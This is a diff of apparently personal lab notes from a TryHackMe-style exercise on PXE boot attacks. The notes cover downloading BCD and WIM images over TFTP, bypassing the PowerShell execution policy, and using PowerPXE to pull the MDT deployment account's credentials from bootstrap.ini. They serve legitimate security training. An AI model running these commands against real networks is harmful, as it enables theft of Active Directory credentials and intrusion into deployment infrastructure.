@@ -31,53 +31,59 @@ We can exploit the PXE boot image for two different purposes:
 
 We will attempt to recover the deployment service account associated with the MDT service during installation for this password scraping attack
 
-PXE Boot Image Retrieval:
-    The 1st piece of information regarding the PXE Boot preconfigure you would have received via DHCP is the IP of the MDT server.
-    The 2cd piece of information you would have received was the names of the BCD files. 
-        These files store the information relevant to PXE Boots for the different types of architecture
-        We will focus on the BCD file of the x64 architecture
-
-With this initial information now recovered from DHC, we can enumerate and retrieve the PXE Boot image. 
-
-We will be using our SSH connection on THMJMP1 (server):
-
-ssh thm@THMJMP1.com
-Password: Victim
-
-    The first step we need to perform is using TFTP and downloading our BCD file to read the configuration of the MDT server.
-    ->#tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
-
-We will be using powerpxe to read its contents. 
-Powerpxe is a PowerShell script that automatically performs this type of attack but usually with varying results, so it is better to perform a manual approach. 
-We will use the Get-WimFile function of powerpxe to recover the locations of the PXE Boot images from the BCD file:
-
-    ->#powershell -executionpolicy bypass
-    Windows PowerShell
-    Copyright (C) Microsoft Corporation. All rights reserved.   
-
-    PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
-    PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
-    PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
-    >> Parse the BCD file: conf.bcd
-    >>>> Identify wim file : <PXE Boot Image Location>
-    <PXE Boot Image Location>
-
-WIM files are bootable images in the Windows Imaging Format (WIM). 
-Now that we have the location of the PXE Boot image, we can again use TFTP to download this image:
-    ->#tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
-
-Recovering Credentials from a PXE Boot Image:
-We ill focus on a simple attack of just attempting to exfiltrate credentials:
 
 
-Again we will use powerpxe to recover the credentials, 
-but you could also do this step manually by extracting the image and looking for the bootstrap.ini file, 
-where these types of credentials are often stored. 
+##############################
+Perform password scraping attacks to recover AD credentials used during the install Attack:
+##############################
+    PXE Boot Image Retrieval:
+        The 1st piece of information regarding the PXE Boot preconfigure you would have received via DHCP is the IP of the MDT server.
+        The 2cd piece of information you would have received was the names of the BCD files. 
+            These files store the information relevant to PXE Boots for the different types of architecture
+            
+            We will focus on the BCD file of the x64 architecture
 
-    ->#SSh acces> Get-FindCredentials -WimFile pxeboot.wim
-        >> Open pxeboot.wim
-        >>>> Finding Bootstrap.ini
-        >>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
-        >>>> >>>> UserID = <account>
-        >>>> >>>> UserDomain = ZA
-        >>>> >>>> UserPassword = <password>
+    With this initial information now recovered from DHC, we can enumerate and retrieve the PXE Boot image. 
+
+    We will be using our SSH connection on THMJMP1 (server):
+        ssh thm@THMJMP1.com
+        Password: Victim
+
+            The first step we need to perform is using TFTP and downloading our BCD file to read the configuration of the MDT server.
+            ->#tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
+
+    We will be using powerpxe to read its contents. 
+    Powerpxe is a PowerShell script that automatically performs this type of attack but usually with varying results, so it is better to perform a manual approach. 
+    We will use the Get-WimFile function of powerpxe to recover the locations of the PXE Boot images from the BCD file:
+
+        ->#powershell -executionpolicy bypass
+        Windows PowerShell
+        Copyright (C) Microsoft Corporation. All rights reserved.   
+
+        PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
+        PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
+        PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
+        >> Parse the BCD file: conf.bcd
+        >>>> Identify wim file : <PXE Boot Image Location>
+        <PXE Boot Image Location>
+
+    WIM files are bootable images in the Windows Imaging Format (WIM). 
+    Now that we have the location of the PXE Boot image, we can again use TFTP to download this image:
+        ->#tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
+            We Get Credentials
+
+    Recovering Credentials from a PXE Boot Image:
+    We ill focus on a simple attack of just attempting to exfiltrate credentials:
+
+
+    Again we will use powerpxe to recover the credentials, 
+    but you could also do this step manually by extracting the image and looking for the bootstrap.ini file, 
+    where these types of credentials are often stored. 
+
+        ->#SSh acces> Get-FindCredentials -WimFile pxeboot.wim
+            >> Open pxeboot.wim
+            >>>> Finding Bootstrap.ini
+            >>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
+            >>>> >>>> UserID = <account>
+            >>>> >>>> UserDomain = ZA
+            >>>> >>>> UserPassword = <password>
